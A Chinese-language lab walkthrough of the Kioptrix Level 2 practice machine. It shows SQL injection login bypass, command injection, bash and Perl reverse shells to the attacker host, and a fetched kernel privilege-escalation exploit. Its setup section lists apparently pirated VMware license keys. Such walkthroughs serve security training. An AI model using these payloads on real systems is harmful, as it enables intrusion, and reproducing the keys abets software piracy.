# Kioptrix: Level 1.1 (#2) #  

## 准备工作 ##  

- 虚拟机软件  
VMware Workstation Pro 15.0.0 / 14.1.3 / 12.5.9 / 10.0.7 with Keygen  
VMware Workstation Pro 15.0.0 Build 10134415 – Windows x64  
https://download3.vmware.com/software/wkst/file/VMware-workstation-full-15.0.0-10134415.exe  
软件授权许可证密钥  

```
VMware Workstation Pro 15 License Keys

GF14A-82G8H-H8DRZ-A4QET-XC2G6
ZU3J0-APDDM-H8DPP-6XNQC-NUAZ0
ZU510-24E0K-H8ECP-14WXE-Z7K88
RZ9ZX-ZPN6V-V1QNP-JDPGX-N7ZQV
ZU54H-AAY87-M819Y-4ZY5V-WYAZ4
GF382-6UWDJ-48ETP-ANXQT-M78W6
ZNVXA-C4GKG-U1RFW-RDNV3-7P5XT
UA3EU-F9E0K-H8E6Y-WDNZV-W70FF
```

- 攻击机器：kali-2018.3a  
https://www.kali.org/  
https://www.kali.org/downloads/  
Kali Linux 64 Bit  
http://cdimage.kali.org/kali-2018.3a/kali-linux-2018.3a-amd64.iso  
Kali Linux Vm 64 Bit 7z  
https://images.offensive-security.com/virtual-images/kali-linux-2018.3-vm-amd64.7z  

- 靶机：Kioptrix: Level 1.1 (#2)  
Kioptrix_Level_2-update.rar (Size: 406 MB)  
Download (Mirror): https://download.vulnhub.com/kioptrix/Kioptrix_Level_2-update.rar  
Download (Torrent): https://download.vulnhub.com/kioptrix/Kioptrix_Level_2-update.rar.torrent  

## 环境搭建 ##  

建议网络适配器NAT模式安装Kali和靶机。  
靶机默认使用自动桥接，删除网络适配器，创建NAT模式的网络适配器2即可。  

![file](http://ozpdcy1zs.bkt.clouddn.com/8a1ec71a4af70caaa00c169f2d35e1c9.png-quanzi)  

![file](http://ozpdcy1zs.bkt.clouddn.com/006767bbd9474c3661ee83caf3f00edc.png-quanzi)  

![file](http://ozpdcy1zs.bkt.clouddn.com/f935ab8890cab73f5ee164f6234ea074.png-quanzi)  

## 主机发现 ##  

主机发现我们这里采用两种办法。  

netdiscover  
主动模式  
```
netdiscover -i eth0
```

查看Kali虚拟机的ip地址 `ifconfig`  

```
root@mannix-kali-2018-3a:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.142.129  netmask 255.255.255.0  broadcast 192.168.142.255
        inet6 fe80::20c:29ff:fe48:c827  prefixlen 64  scopeid 0x20<link>
        ether 00:0c:29:48:c8:27  txqueuelen 1000  (Ethernet)
        RX packets 324  bytes 20813 (20.3 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 63  bytes 4957 (4.8 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 20  bytes 1116 (1.0 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 20  bytes 1116 (1.0 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![file](http://ozpdcy1zs.bkt.clouddn.com/5289575811fd530d9ca6c6f7f1e12f71.png-quanzi)  

主机发现 `netdiscover -i eth0 -r 192.168.142.0/24`  

```
 -----------------------------------------------------------------------------
 192.168.142.1   00:50:56:c0:00:08     16     960  VMware, Inc.                
 192.168.142.2   00:50:56:e8:c7:e8      2     120  VMware, Inc.                
 192.168.142.131 00:0c:29:53:19:56      1      60  VMware, Inc.                
 192.168.142.254 00:50:56:e2:0f:cf      1      60  VMware, Inc.   
```

![file](http://ozpdcy1zs.bkt.clouddn.com/f0b7d30771d1de3861c7005eea3d45fa.png-quanzi)  

另外一种方式  

```
nmap 192.168.142.0/24 -n -sn -sP
```

```
root@mannix-kali-2018-3a:~# nmap 192.168.142.0/24 -n -sn -sP
Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-06 16:56 CST
Nmap scan report for 192.168.142.1
Host is up (0.00019s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.142.2
Host is up (0.00010s latency).
MAC Address: 00:50:56:E8:C7:E8 (VMware)
Nmap scan report for 192.168.142.131
Host is up (0.00016s latency).
MAC Address: 00:0C:29:53:19:56 (VMware)
Nmap scan report for 192.168.142.254
Host is up (0.00012s latency).
MAC Address: 00:50:56:E2:0F:CF (VMware)
Nmap scan report for 192.168.142.129
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 2.22 seconds
```

![file](http://ozpdcy1zs.bkt.clouddn.com/70c51bc4ddf953478e6a3fcbfeeddb67.png-quanzi)  

## 端口扫描 ##  

端口扫描工具Nmap  

命令  
`nmap 192.168.142.131 -p- -O -sS -sV -v -A`  

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            611/udp  status
|_  100024  1            614/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: md5WithRSAEncryption
| Not valid before: 2009-10-08T00:10:47
| Not valid after:  2010-10-08T00:10:47
| MD5:   01de 29f9 fbfb 2eb2 beaf e624 3157 090f
|_SHA-1: 560c 9196 6506 fb0f fb81 66b1 ded3 ac11 2ed4 808a
|_ssl-date: 2018-10-06T05:50:28+00:00; -3h09m39s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
614/tcp  open  status   1 (RPC #100024)
631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:53:19:56 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Uptime guess: 0.011 days (since Sat Oct  6 16:43:54 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=198 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: mean: -3h09m39s, deviation: 0s, median: -3h09m39s

TRACEROUTE
HOP RTT     ADDRESS
1   0.34 ms 192.168.142.131
```

![file](http://ozpdcy1zs.bkt.clouddn.com/1113c2b04aef437f89737270d6bcde29.png-quanzi)  

## SQL注入 ##  

打开链接http://192.168.142.131/，进入网站  

![file](http://ozpdcy1zs.bkt.clouddn.com/fedfacd3f2043ce5a72cc19ec655f9fb.png-quanzi)  

输入 admin admin 使用抓包软件抓包查看  

![file](http://ozpdcy1zs.bkt.clouddn.com/71ab00871ccb2674f18918255178c1f2.png-quanzi)  

经测试，登录口存在SQL注入漏洞，万能密码登录  

```
'or''=' 'or''='
```

![file](http://ozpdcy1zs.bkt.clouddn.com/a3952056551c9149b4926a90ee49e3d5.png-quanzi)  

![file](http://ozpdcy1zs.bkt.clouddn.com/4d1e6e1826cb6f3a6b9ed307ef2d49aa.png-quanzi)  

## 命令注入 ##  

系统登录成功进入链接http://192.168.142.131/index.php  

![file](http://ozpdcy1zs.bkt.clouddn.com/a30a3f6ff1df0823565ff671cb48f17c.png-quanzi)  

这里本意是一个ping语句，但是存在命令注入。  

简单语句测试：`127.0.0.1;ifconfig`  

![file](http://ozpdcy1zs.bkt.clouddn.com/894886d41536166688d8a7e911f2c008.png-quanzi)  

这里可以直接通过命令反弹shell  

参考文档链接：  
反弹shell备忘录  
http://www.legendsec.org/1965.html  

### Bash ###  

Kali监听8888端口 `netcat -lvp 8888`  

http://192.168.142.131/index.php网站执行命令 `127.0.0.1;bash -i >& /dev/tcp/192.168.142.129/8888 0>&1`  

![file](http://ozpdcy1zs.bkt.clouddn.com/dc796e2785fab7168063dd367baed9ad.png-quanzi)  

成功反弹shell。  

![file](http://ozpdcy1zs.bkt.clouddn.com/002e678f20e2fccf3307bbee6edf2aed.png-quanzi)  

### PERL ###  

Kali监听4444端口 `netcat -lvp 4444`  

http://192.168.142.131/index.php网站执行命令  

```
127.0.0.1;perl -e 'use Socket;$i="192.168.142.129";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

![file](http://ozpdcy1zs.bkt.clouddn.com/5a71fce31bd0e1e9ef906198d6e3a2c2.png-quanzi)  

成功反弹shell。  

![file](http://ozpdcy1zs.bkt.clouddn.com/d2088f6332bc7d8e48b8c3ad818c237d.png-quanzi)  

## 提权操作 ##  

反弹shell权限很低，所以我们需要提权。系统版本为`Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
`  

我们使用提权文件`https://www.exploit-db.com/download/9542.c`  

![file](http://ozpdcy1zs.bkt.clouddn.com/cd2957649c7155482a680180f8c0ab1f.png-quanzi)  

把文件复制到Apache的根目录 `cp 9542.c /var/www/html/escpriv.c`  

开启Apache服务 `service apache2 start`  

查看Kali虚拟机80端口开放情况  

http://192.168.142.129/  

![file](http://ozpdcy1zs.bkt.clouddn.com/5e8e639e051f3927344cf64626cf7e63.png-quanzi)  

查看提权文件  

http://192.168.142.129/escpriv.c  

![file](http://ozpdcy1zs.bkt.clouddn.com/f1eb102da9f9b29219feddca67cb3b55.png-quanzi)  

![file](http://ozpdcy1zs.bkt.clouddn.com/b7fd5b7c2bb2bfe244bd27d36a878016.png-quanzi)  

在之前的shell执行命令  

```
cd /tmp
wget 192.168.142.129/escpriv.c
gcc escpriv.c -o rootMe
./rootMe
```

![file](http://ozpdcy1zs.bkt.clouddn.com/73003342abcd8eeee243084e05bc144a.png-quanzi)  

提权成功。  

## 其他漏洞 ##  

敏感信息泄漏  

查看index.php源码  

```
; cat index.php
```

![file](http://ozpdcy1zs.bkt.clouddn.com/4b118a7cd4bd6464c274483ec8a1a8d9.png-quanzi)  

![file](http://ozpdcy1zs.bkt.clouddn.com/40a0023df71bfe401cfc9bf2e4686b69.png-quanzi)  

![file](http://ozpdcy1zs.bkt.clouddn.com/64edaa2626a0967632ca603777330203.png-quanzi)  

```
<?php
	mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
	//print "Connected to MySQL<br />";
```

其他漏洞自己玩吧。  

![file](http://ozpdcy1zs.bkt.clouddn.com/13b146ba5092060a35cd2f1062fbf98f.png-quanzi)